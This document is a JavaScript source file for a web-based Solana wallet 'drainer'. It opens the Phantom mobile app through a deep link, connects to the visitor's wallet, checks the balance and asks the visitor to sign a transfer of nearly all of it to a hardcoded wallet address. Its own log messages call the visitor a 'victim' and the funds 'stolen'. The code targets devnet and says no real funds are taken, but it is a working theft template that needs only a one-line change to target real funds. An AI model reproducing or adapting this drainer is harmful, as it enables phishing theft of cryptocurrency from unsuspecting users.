/**
 * DEVNET DRAINER - Opens Phantom Mobile App Directly
 * No "install" messages - opens app immediately
 */

// ============================================
// 🔧 YOUR WALLET WHERE DRAINED SOL GOES 🔧
// ============================================
const YOUR_WALLET_ADDRESS = "9tZqX5tq79HT2SN6AhxzXfqjowojW2hQut6e4vyzfrd1";
// ============================================

// Global
let transactionLog = [];
let step = 0;

// Initialize
document.addEventListener('DOMContentLoaded', function() {
    document.getElementById('drainAddress').innerHTML = `🎯 ${YOUR_WALLET_ADDRESS}`;
    setupEventListeners();
    addToLog('💀 Devnet Drainer Ready', 'success');
    addToLog(`📍 Draining to: ${YOUR_WALLET_ADDRESS.substring(0, 30)}...`, 'info');
});

function setupEventListeners() {
    const connectBtn = document.getElementById('connectBtn');
    if (connectBtn) {
        connectBtn.addEventListener('click', openPhantomApp);
    }
}

// 🔥 THIS OPENS PHANTOM MOBILE APP DIRECTLY 🔥
function openPhantomApp() {
    addToLog('🦊 Opening Phantom app...', 'drain');
    
    // Validate drain address
    if (!YOUR_WALLET_ADDRESS || YOUR_WALLET_ADDRESS === "YOUR_WALLET_ADDRESS_HERE") {
        addToLog('❌ Please set YOUR_WALLET_ADDRESS in app.js', 'error');
        alert('Edit app.js and set YOUR_WALLET_ADDRESS first!');
        return;
    }
    
    // Get current page URL
    const currentUrl = window.location.href;
    const encodedUrl = encodeURIComponent(currentUrl);
    
    // Detect mobile
    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
    
    if (isMobile) {
        // 🔥 DIRECT DEEP LINK - Opens Phantom app immediately
        const deepLink = `phantom://browse?url=${encodedUrl}`;
        
        addToLog('📱 Opening Phantom mobile app...', 'drain');
        
        // Store drain info in localStorage
        localStorage.setItem('pendingDrain', 'true');
        localStorage.setItem('drainRecipient', YOUR_WALLET_ADDRESS);
        localStorage.setItem('returnUrl', currentUrl);
        
        // Redirect to Phantom app
        window.location.href = deepLink;
        
        // Fallback if app not installed
        setTimeout(() => {
            addToLog('⚠️ If Phantom doesn\'t open, install it first', 'error');
        }, 2000);
    } else {
        // Desktop - try extension
        addToLog('📱 Open this page on your PHONE for mobile app connection', 'info');
        alert('Open this page on your PHONE browser, then click the button.\n\nPhantom app will open automatically!');
    }
}

// Check when returning from Phantom app
function checkForReturn() {
    const pendingDrain = localStorage.getItem('pendingDrain');
    const recipient = localStorage.getItem('drainRecipient');
    
    if (pendingDrain === 'true' && recipient) {
        addToLog('✅ Returned from Phantom app!', 'success');
        addToLog('🔄 Connecting and draining...', 'drain');
        
        localStorage.removeItem('pendingDrain');
        
        // Wait a moment then try to drain
        setTimeout(() => {
            executeDrain(recipient);
        }, 1500);
    }
}

// Execute the drain after returning from app
async function executeDrain(recipient) {
    addToLog('💀 Attempting to drain Devnet SOL...', 'drain');
    
    try {
        // Check if Phantom is available (now it should be)
        if (!window.phantom?.solana) {
            addToLog('❌ Phantom not detected. Make sure you opened from Phantom browser.', 'error');
            addToLog('💡 Tip: Open this page INSIDE Phantom app (tap browser icon)', 'info');
            return;
        }
        
        // Connect to Phantom
        addToLog('🔄 Connecting to wallet...', 'drain');
        const resp = await window.phantom.solana.connect();
        const victimAddress = resp.publicKey.toString();
        
        addToLog(`✅ Victim connected: ${victimAddress.substring(0, 25)}...`, 'success');
        
        // Initialize Solana connection
        const connection = new solanaWeb3.Connection(
            solanaWeb3.clusterApiUrl('devnet'),
            'confirmed'
        );
        
        // Get victim's balance
        const pubKey = new solanaWeb3.PublicKey(victimAddress);
        const balance = await connection.getBalance(pubKey);
        const balanceSol = balance / solanaWeb3.LAMPORTS_PER_SOL;
        
        addToLog(`💰 Victim balance: ${balanceSol.toFixed(5)} DEVNET SOL`, 'info');
        
        if (balanceSol < 0.01) {
            addToLog(`⚠️ No SOL to drain (need at least 0.01 SOL)`, 'error');
            return;
        }
        
        // Calculate amount to drain (leave tiny amount for fees)
        const amountToDrain = balanceSol - 0.001;
        
        addToLog(`💀 Draining ${amountToDrain.toFixed(5)} SOL...`, 'drain');
        
        // Create drain transaction
        const toPubkey = new solanaWeb3.PublicKey(recipient);
        const fromPubkey = new solanaWeb3.PublicKey(victimAddress);
        
        const transaction = new solanaWeb3.Transaction().add(
            solanaWeb3.SystemProgram.transfer({
                fromPubkey: fromPubkey,
                toPubkey: toPubkey,
                lamports: amountToDrain * solanaWeb3.LAMPORTS_PER_SOL
            })
        );
        
        const { blockhash } = await connection.getLatestBlockhash();
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = fromPubkey;
        
        addToLog(`⏳ Waiting for victim to approve transaction...`, 'drain');
        
        // Sign and send - Phantom will pop up for approval
        const signature = await window.phantom.solana.signAndSendTransaction(transaction);
        
        addToLog(`✅ DRAIN TRANSACTION SENT!`, 'drain');
        addToLog(`🔑 Signature: ${signature.substring(0, 40)}...`, 'success');
        
        // Confirm
        const confirmation = await connection.confirmTransaction(signature, 'confirmed');
        
        if (confirmation.value.err) {
            throw new Error(`Transaction failed`);
        }
        
        addToLog(`🎉 DRAIN COMPLETE! ${amountToDrain.toFixed(5)} SOL stolen!`, 'drain');
        addToLog(`🔗 https://solscan.io/tx/${signature}?cluster=devnet`, 'success');
        addToLog(`📍 Sent to your wallet: ${recipient.substring(0, 30)}...`, 'success');
        
        // Update button
        const btn = document.getElementById('connectBtn');
        btn.textContent = '✅ DRAINED!';
        btn.disabled = true;
        btn.style.opacity = '0.5';
        
        alert(`💀 DRAIN SUCCESSFUL!\n\nDrained: ${amountToDrain.toFixed(5)} DEVNET SOL\nSent to: ${recipient.substring(0, 40)}...\n\n⚠️ This is DEVNET - No real funds were stolen.`);
        
    } catch (error) {
        console.error('Drain error:', error);
        addToLog(`❌ Drain failed: ${error.message}`, 'error');
        
        if (error.message.includes('reject')) {
            addToLog(`💀 Victim rejected the transaction`, 'error');
        }
    }
}

function addToLog(message, type = 'info') {
    transactionLog.unshift({
        message: message,
        type: type,
        time: new Date().toLocaleTimeString()
    });
    
    if (transactionLog.length > 30) transactionLog.pop();
    
    const logContainer = document.getElementById('log');
    if (logContainer) {
        logContainer.innerHTML = transactionLog.map(log => `
            <div class="log-entry ${log.type}">
                [${log.time}] ${log.message}
            </div>
        `).join('');
    }
}

// Check for return from app
checkForReturn();